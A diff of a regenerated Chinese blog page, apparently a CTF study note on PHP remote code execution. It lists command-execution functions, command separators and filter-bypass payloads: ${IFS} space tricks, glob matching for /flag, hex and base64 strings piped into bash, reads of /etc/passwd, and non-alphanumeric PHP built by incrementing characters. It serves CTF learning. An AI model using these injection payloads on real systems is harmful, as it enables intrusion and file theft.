@@ -35,16 +35,43 @@
 system()指令用于执行系统命令，如
 
 
-    
-    system(&#39;ls&#39;);
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  system(&#39;ls&#39;);
 system(&#39;cat&#39;);
 //记得在每一条指令后面加；
-
+  
+  
 其它函数：
 
 
-    
-    //具体函数内容查看手册
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  //具体函数内容查看手册
 exec
 shell_exec
 passthru
@@ -63,16 +90,32 @@ error_reporting(0);
 $new_func = create_function(&#39;$a,$b&#39;,&#39;return &#34;$a  &#34;.&#34;$b&#34;;&#39;);//new_func为函数名，$a $b为参数，后面代码
 echo $new_func(&#39;hello&#39;,&#39;hack&#39;).&#34;\n&#34;;
 ?&gt;
-
+  
+  
 连接两个命令
 
 
-    
-    |
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  |
 ||
 &amp;
 &amp;&amp;
 ;
+  
+  
 绕过 link
 简单绕过关键词过滤a=eval($_GET[&#39;A&#39;])&amp;A=system
 内联执行：cat `ls`，echo $(ls)
@@ -81,8 +124,21 @@ echo $new_func(&#39;hello&#39;,&#39;hack&#39;).&#34;\n&#34;;
 绕过内置过滤函数
 
 
-    
-    $url=escapeshellarg($url);
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  $url=escapeshellarg($url);
 
 $url=escapeshellcmd($url);
 /*
@@ -90,17 +146,9 @@ $url=escapeshellcmd($url);
 返回&#39;1&#39;\\&#39;&#39;XXX\&#39;
 \被转义，还多出来一个&#39;
 */
-绕过文件名限制
-
-
-    
-    cat /f*
-# 过滤f l a g时，使用glob通配符绕过
-# file:///D:/ctf/doc/Linux shell通配符_ glob.htm
-more /[e-h][k-m][0-b][e-h]
-# “ _[A-Fa-f0-9]_ ”相当于 &#34; _[ABCDEFabcdef0123456789]_ &#34;.)
-# “ _[-%]_ ”代表“ _[!”#$%]_ ”而“ _[az]_ ”代表“任何 小写字母”
-编码绕过" />
+  
+  
+绕过文件名限制" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="http://localhost:1313/docs/ctf/%E7%9F%A5%E8%AF%86%E7%82%B9/rce/" /><meta property="og:image" content="http://localhost:1313/opengraph/card-base-2_hu_22b16914b0ae0efa.png"/><meta property="article:section" content="docs" />
 <meta property="article:published_time" content="2025-05-30T10:12:11+08:00" />
@@ -112,16 +160,43 @@ more /[e-h][k-m][0-b][e-h]
 system()指令用于执行系统命令，如
 
 
-    
-    system(&#39;ls&#39;);
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  system(&#39;ls&#39;);
 system(&#39;cat&#39;);
 //记得在每一条指令后面加；
-
+  
+  
 其它函数：
 
 
-    
-    //具体函数内容查看手册
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  //具体函数内容查看手册
 exec
 shell_exec
 passthru
@@ -140,16 +215,32 @@ error_reporting(0);
 $new_func = create_function(&#39;$a,$b&#39;,&#39;return &#34;$a  &#34;.&#34;$b&#34;;&#39;);//new_func为函数名，$a $b为参数，后面代码
 echo $new_func(&#39;hello&#39;,&#39;hack&#39;).&#34;\n&#34;;
 ?&gt;
-
+  
+  
 连接两个命令
 
 
-    
-    |
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  |
 ||
 &amp;
 &amp;&amp;
 ;
+  
+  
 绕过 link
 简单绕过关键词过滤a=eval($_GET[&#39;A&#39;])&amp;A=system
 内联执行：cat `ls`，echo $(ls)
@@ -158,8 +249,21 @@ echo $new_func(&#39;hello&#39;,&#39;hack&#39;).&#34;\n&#34;;
 绕过内置过滤函数
 
 
-    
-    $url=escapeshellarg($url);
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  $url=escapeshellarg($url);
 
 $url=escapeshellcmd($url);
 /*
@@ -167,17 +271,9 @@ $url=escapeshellcmd($url);
 返回&#39;1&#39;\\&#39;&#39;XXX\&#39;
 \被转义，还多出来一个&#39;
 */
-绕过文件名限制
-
-
-    
-    cat /f*
-# 过滤f l a g时，使用glob通配符绕过
-# file:///D:/ctf/doc/Linux shell通配符_ glob.htm
-more /[e-h][k-m][0-b][e-h]
-# “ _[A-Fa-f0-9]_ ”相当于 &#34; _[ABCDEFabcdef0123456789]_ &#34;.)
-# “ _[-%]_ ”代表“ _[!”#$%]_ ”而“ _[az]_ ”代表“任何 小写字母”
-编码绕过"/>
+  
+  
+绕过文件名限制"/>
 
     
         <link rel="alternate" type="application/atom+xml" title="Atom feed for 遥乡书屋" href="/index.xml" />
@@ -511,44 +607,87 @@ more /[e-h][k-m][0-b][e-h]
 system()指令用于执行系统命令，如</p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#39;ls&#39;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#39;cat&#39;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#75715e">//记得在每一条指令后面加；
-</span></span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="58ae8ef" class="language-php ">
+  <code>system(&#39;ls&#39;);
+system(&#39;cat&#39;);
+//记得在每一条指令后面加；</code>
+  </pre>
+  </div>
 <p>其它函数：</p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">//具体函数内容查看手册
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">exec</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">shell_exec</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">passthru</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">popen</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">proc_popen</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Assert</span>(<span style="color:#a6e22e">mixed</span> $assertion,<span style="color:#a6e22e">string</span> $description <span style="color:#f92672">=</span> <span style="color:#f92672">?</span>)
-</span></span><span style="display:flex;"><span><span style="color:#75715e">//会检查assertion，如果是字符串，会被当成php代码执行
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">Call_user_func</span>(<span style="color:#a6e22e">callable</span> $callback <span style="color:#a6e22e">…</span><span style="color:#f92672">..</span>)
-</span></span><span style="display:flex;"><span><span style="color:#75715e">//callback是被调用的回调函数
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">Call_user_func_array</span>(<span style="color:#a6e22e">callable</span> $callback)
-</span></span><span style="display:flex;"><span><span style="color:#75715e">//同上
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">Creat_function</span>(<span style="color:#a6e22e">args</span>,<span style="color:#a6e22e">code</span>)
-</span></span><span style="display:flex;"><span><span style="color:#75715e">//如
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>$new_func <span style="color:#f92672">=</span> <span style="color:#a6e22e">create_function</span>(<span style="color:#e6db74">&#39;$a,$b&#39;</span>,<span style="color:#e6db74">&#39;return &#34;$a  &#34;.&#34;$b&#34;;&#39;</span>);<span style="color:#75715e">//new_func为函数名，$a $b为参数，后面代码
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">echo</span> $new_func(<span style="color:#e6db74">&#39;hello&#39;</span>,<span style="color:#e6db74">&#39;hack&#39;</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="970f1de" class="language-php ">
+  <code>//具体函数内容查看手册
+exec
+shell_exec
+passthru
+popen
+proc_popen
+Assert(mixed $assertion,string $description = ?)
+//会检查assertion，如果是字符串，会被当成php代码执行
+Call_user_func(callable $callback …..)
+//callback是被调用的回调函数
+Call_user_func_array(callable $callback)
+//同上
+Creat_function(args,code)
+//如
+&lt;?php
+error_reporting(0);
+$new_func = create_function(&#39;$a,$b&#39;,&#39;return &#34;$a  &#34;.&#34;$b&#34;;&#39;);//new_func为函数名，$a $b为参数，后面代码
+echo $new_func(&#39;hello&#39;,&#39;hack&#39;).&#34;\n&#34;;
+?&gt;</code>
+  </pre>
+  </div>
 <p>连接两个命令</p>
 
 
-    
-    <pre tabindex="0"><code>|
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="2c5b2cc" class="language- ">
+  <code>|
 ||
 &amp;
 &amp;&amp;
-;</code></pre>
+;</code>
+  </pre>
+  </div>
 <h2 id="绕过">绕过 <a href="#%e7%bb%95%e8%bf%87" class="anchor" aria-hidden="true"><i class="material-icons align-middle">link</i></a></h2><ul>
 <li>简单绕过关键词过滤<code>a=eval($_GET['A'])&amp;A=system</code></li>
 <li>内联执行：cat `ls`，echo $(ls)</li>
@@ -557,53 +696,111 @@ system()指令用于执行系统命令，如</p>
 <p>绕过内置过滤函数</p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$url<span style="color:#f92672">=</span><span style="color:#a6e22e">escapeshellarg</span>($url);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>$url<span style="color:#f92672">=</span><span style="color:#a6e22e">escapeshellcmd</span>($url);
-</span></span><span style="display:flex;"><span><span style="color:#75715e">/*
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">连用会产生单引号逃逸，传入1&#39; xxx
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">返回&#39;1&#39;\\&#39;&#39;XXX\&#39;
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">\被转义，还多出来一个&#39;
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span></span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="d8357b2" class="language-php ">
+  <code>$url=escapeshellarg($url);
+
+$url=escapeshellcmd($url);
+/*
+连用会产生单引号逃逸，传入1&#39; xxx
+返回&#39;1&#39;\\&#39;&#39;XXX\&#39;
+\被转义，还多出来一个&#39;
+*/</code>
+  </pre>
+  </div>
 <p>绕过文件名限制</p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /f*
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 过滤f l a g时，使用glob通配符绕过</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># file:///D:/ctf/doc/Linux shell通配符_ glob.htm</span>
-</span></span><span style="display:flex;"><span>more /<span style="color:#f92672">[</span>e-h<span style="color:#f92672">][</span>k-m<span style="color:#f92672">][</span>0-b<span style="color:#f92672">][</span>e-h<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># “ _[A-Fa-f0-9]_ ”相当于 &#34; _[ABCDEFabcdef0123456789]_ &#34;.)</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># “ _[-%]_ ”代表“ _[!”#$%]_ ”而“ _[az]_ ”代表“任何 小写字母”</span></span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="f059983" class="language-bash ">
+  <code>cat /f*
+# 过滤f l a g时，使用glob通配符绕过
+# file:///D:/ctf/doc/Linux shell通配符_ glob.htm
+more /[e-h][k-m][0-b][e-h]
+# “ _[A-Fa-f0-9]_ ”相当于 &#34; _[ABCDEFabcdef0123456789]_ &#34;.)
+# “ _[-%]_ ”代表“ _[!”#$%]_ ”而“ _[az]_ ”代表“任何 小写字母”</code>
+  </pre>
+  </div>
 <p>编码绕过</p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 回显只有数字情况下，使用od进行输出：</span>
-</span></span><span style="display:flex;"><span>od -t d1 /flag
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 这是一个命令行指令，用于以十进制形式显示 /flag 文件的内容，具体来说-t 参数用于指定展示的数据格式，d1 表示每个数值使用一个字节来显示，即按字节读取。</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 16进制，先bin2hex</span>
-</span></span><span style="display:flex;"><span>php -r eval<span style="color:#f92672">(</span>hex2bin<span style="color:#f92672">(</span>substr<span style="color:#f92672">(</span>_十六进制,1<span style="color:#f92672">)))</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 63617420666c61672e706870是cat flag.php的16进制</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># cat /etc/passwd</span>
-</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;636174202F6574632F706173737764&#34;</span> | xxd -r -p|bash
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># php 十六进制绕过 system();</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x73\x79\x73\x74\x65\x6d&#34;</span><span style="color:#f92672">()</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 或者base64/32</span>
-</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;base64编码&#34;</span>|base64 -d|bash
-</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;base64编码&#34;</span>|base64 -d|sh
-</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;Y2F0wqAK&#39;</span> | base64 -d /etc/passwd <span style="color:#75715e"># cat /etc/passwd</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 八进制</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># ls</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">$(</span>printf <span style="color:#e6db74">&#34;\154\163&#34;</span><span style="color:#66d9ef">)</span></span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="5ca7b54" class="language-bash ">
+  <code># 回显只有数字情况下，使用od进行输出：
+od -t d1 /flag
+# 这是一个命令行指令，用于以十进制形式显示 /flag 文件的内容，具体来说-t 参数用于指定展示的数据格式，d1 表示每个数值使用一个字节来显示，即按字节读取。
+
+# 16进制，先bin2hex
+php -r eval(hex2bin(substr(_十六进制,1)))
+# 63617420666c61672e706870是cat flag.php的16进制
+# cat /etc/passwd
+echo &#34;636174202F6574632F706173737764&#34; | xxd -r -p|bash
+# php 十六进制绕过 system();
+&#34;\x73\x79\x73\x74\x65\x6d&#34;();
+
+# 或者base64/32
+echo &#34;base64编码&#34;|base64 -d|bash
+echo &#34;base64编码&#34;|base64 -d|sh
+echo &#39;Y2F0wqAK&#39; | base64 -d /etc/passwd # cat /etc/passwd
+# 八进制
+# ls
+$(printf &#34;\154\163&#34;)</code>
+  </pre>
+  </div>
 <p>绕过空格</p>
 
 
-    
-    <pre tabindex="0"><code>%09（url传递）(tab)
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="f5e57ac" class="language- ">
+  <code>%09（url传递）(tab)
 %20(space)
 ${IFS}
 $IFS$9
@@ -612,175 +809,250 @@ $IFS$1
 &lt;（cat&lt;/flag）
 $IFS
 {cat,flag}//花括号
-/**/</code></pre>
+/**/</code>
+  </pre>
+  </div>
 <p>绕过特定命令</p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># $1、$2等和 $@绕过</span>
-</span></span><span style="display:flex;"><span>l$1s
-</span></span><span style="display:flex;"><span>ca$2t
-</span></span><span style="display:flex;"><span>fl$@ag
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># &#39;\&#39;和&#39;以及`绕过滤</span>
-</span></span><span style="display:flex;"><span>ca<span style="color:#ae81ff">\t</span> flag
-</span></span><span style="display:flex;"><span>ca<span style="color:#e6db74">&#39;&#39;</span>t flag
-</span></span><span style="display:flex;"><span>ca<span style="color:#e6db74">&#34;&#34;</span>t flag 
-</span></span><span style="display:flex;"><span>ca<span style="color:#e6db74">``</span>t flag
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 括号拼接</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>sy.<span style="color:#f92672">(</span>st<span style="color:#f92672">)</span>.em<span style="color:#f92672">)()</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 注释</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>sy./*A*/<span style="color:#f92672">(</span>st<span style="color:#f92672">)</span>/*A*/.em<span style="color:#f92672">)</span>/*A*/<span style="color:#f92672">(</span>wh./*A*/<span style="color:#f92672">(</span>oa<span style="color:#f92672">)</span>/*A*/.mi<span style="color:#f92672">)</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 变量拆分，此方法同样用于命令拆分，用于php</span>
-</span></span><span style="display:flex;"><span>a<span style="color:#f92672">=</span>c;b<span style="color:#f92672">=</span>a;c<span style="color:#f92672">=</span>t;$a$b$c flag.php
-</span></span><span style="display:flex;"><span>?ip<span style="color:#f92672">=</span>127.0.0.1;a<span style="color:#f92672">=</span>ag;b<span style="color:#f92672">=</span>fl;cat$IFS$9$b$a.php
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 代替system</span>
-</span></span><span style="display:flex;"><span>passthru
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 利用未初始化变量</span>
-</span></span><span style="display:flex;"><span>cat /etc$u/passwd
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># ;拼接绕过/</span>
-</span></span><span style="display:flex;"><span>cd ..;cd ..;cd ..;cd ..;cd etc;cat passwd
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># path绕过</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">${</span>PATH:5:1<span style="color:#e6db74">}</span> <span style="color:#75715e"># l</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">${</span>PATH:2:1<span style="color:#e6db74">}</span> <span style="color:#75715e"># s</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">${</span>PATH:5:1<span style="color:#e6db74">}${</span>PATH:2:1<span style="color:#e6db74">}</span> <span style="color:#75715e"># 拼接后是ls,执行命令</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">${</span>PATH:5:1<span style="color:#e6db74">}</span>s <span style="color:#75715e"># 拼接后是ls,执行命令</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 绕过括号</span>
-</span></span><span style="display:flex;"><span>require <span style="color:#e6db74">&#39;/flag&#39;</span>
-</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">`</span>cat /flag<span style="color:#e6db74">`</span></span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="e73d6d1" class="language-bash ">
+  <code># $1、$2等和 $@绕过
+l$1s
+ca$2t
+fl$@ag
+
+# &#39;\&#39;和&#39;以及`绕过滤
+ca\t flag
+ca&#39;&#39;t flag
+ca&#34;&#34;t flag 
+ca``t flag
+
+# 括号拼接
+(sy.(st).em)();
+
+# 注释
+(sy./*A*/(st)/*A*/.em)/*A*/(wh./*A*/(oa)/*A*/.mi);
+
+# 变量拆分，此方法同样用于命令拆分，用于php
+a=c;b=a;c=t;$a$b$c flag.php
+?ip=127.0.0.1;a=ag;b=fl;cat$IFS$9$b$a.php
+
+# 代替system
+passthru
+
+# 利用未初始化变量
+cat /etc$u/passwd
+
+# ;拼接绕过/
+cd ..;cd ..;cd ..;cd ..;cd etc;cat passwd
+
+# path绕过
+${PATH:5:1} # l
+${PATH:2:1} # s
+${PATH:5:1}${PATH:2:1} # 拼接后是ls,执行命令
+${PATH:5:1}s # 拼接后是ls,执行命令
+
+# 绕过括号
+require &#39;/flag&#39;
+echo `cat /flag`</code>
+  </pre>
+  </div>
 <p>cat打开文件过滤</p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>more
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 一页一页的显示档案内容</span>
-</span></span><span style="display:flex;"><span>less
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 与 more 类似</span>
-</span></span><span style="display:flex;"><span>head
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 查看头几行</span>
-</span></span><span style="display:flex;"><span>tac
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span>
-</span></span><span style="display:flex;"><span>tail
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 查看尾几行</span>
-</span></span><span style="display:flex;"><span>nl
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 显示的时候，顺便输出行号</span>
-</span></span><span style="display:flex;"><span>od
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 以二进制的方式读取档案内容</span>
-</span></span><span style="display:flex;"><span>vi
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 一种编辑器，可以查看</span>
-</span></span><span style="display:flex;"><span>vim
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 一种编辑器，可以查看</span>
-</span></span><span style="display:flex;"><span>sort
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 可以查看</span>
-</span></span><span style="display:flex;"><span>uniq
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 可以查看</span>
-</span></span><span style="display:flex;"><span>file -f
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 报错出具体内容</span>
-</span></span><span style="display:flex;"><span>sh /flag 2&gt;%261
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 报错出文件内容</span></span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="675306b" class="language-bash ">
+  <code>more
+# 一页一页的显示档案内容
+less
+# 与 more 类似
+head
+# 查看头几行
+tac
+# 从最后一行开始显示，可以看出 tac 是 cat 的反向显示
+tail
+# 查看尾几行
+nl
+# 显示的时候，顺便输出行号
+od
+# 以二进制的方式读取档案内容
+vi
+# 一种编辑器，可以查看
+vim
+# 一种编辑器，可以查看
+sort
+# 可以查看
+uniq
+# 可以查看
+file -f
+# 报错出具体内容
+sh /flag 2&gt;%261
+# 报错出文件内容</code>
+  </pre>
+  </div>
 <p>自增
 <a href="https://blog.csdn.net/qq_61778128/article/details/127063407" rel="external" target="_blank">参考文章<svg width="16" height="16" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill="currentColor" d="M14 5c-.552 0-1-.448-1-1s.448-1 1-1h6c.552 0 1 .448 1 1v6c0 .552-.448 1-1 1s-1-.448-1-1v-3.586l-7.293 7.293c-.391.39-1.024.39-1.414 0-.391-.391-.391-1.024 0-1.414l7.293-7.293h-3.586zm-9 2c-.552 0-1 .448-1 1v11c0 .552.448 1 1 1h11c.552 0 1-.448 1-1v-4.563c0-.552.448-1 1-1s1 .448 1 1v4.563c0 1.657-1.343 3-3 3h-11c-1.657 0-3-1.343-3-3v-11c0-1.657 1.343-3 3-3h4.563c.552 0 1 .448 1 1s-.448 1-1 1h-4.563z"/></svg></a>
 &lsquo;a&rsquo;++ =&gt; &lsquo;b&rsquo;，&lsquo;b&rsquo;++ =&gt; &lsquo;c&rsquo;&hellip; 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。
 数组（Array）的第一个字母就是大写A，而且第4个字母是小写a</p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span>$_<span style="color:#f92672">=</span>[];
-</span></span><span style="display:flex;"><span>$_<span style="color:#f92672">=@</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$_</span><span style="color:#e6db74">&#34;</span>; <span style="color:#75715e">// $_=&#39;Array&#39;;
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$_<span style="color:#f92672">=</span>$_[<span style="color:#e6db74">&#39;!&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;@&#39;</span>]; <span style="color:#75715e">// $_=$_[0];
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$___<span style="color:#f92672">=</span>$_; <span style="color:#75715e">// A
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$__<span style="color:#f92672">=</span>$_;
-</span></span><span style="display:flex;"><span>$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;
-</span></span><span style="display:flex;"><span>$___<span style="color:#f92672">.=</span>$__; <span style="color:#75715e">// S
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$___<span style="color:#f92672">.=</span>$__; <span style="color:#75715e">// S
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$__<span style="color:#f92672">=</span>$_;
-</span></span><span style="display:flex;"><span>$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>; <span style="color:#75715e">// E 
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$___<span style="color:#f92672">.=</span>$__;
-</span></span><span style="display:flex;"><span>$__<span style="color:#f92672">=</span>$_;
-</span></span><span style="display:flex;"><span>$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>; <span style="color:#75715e">// R
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$___<span style="color:#f92672">.=</span>$__;
-</span></span><span style="display:flex;"><span>$__<span style="color:#f92672">=</span>$_;
-</span></span><span style="display:flex;"><span>$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>; <span style="color:#75715e">// T
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$___<span style="color:#f92672">.=</span>$__;
-</span></span><span style="display:flex;"><span> 
-</span></span><span style="display:flex;"><span>$____<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;_&#39;</span>;
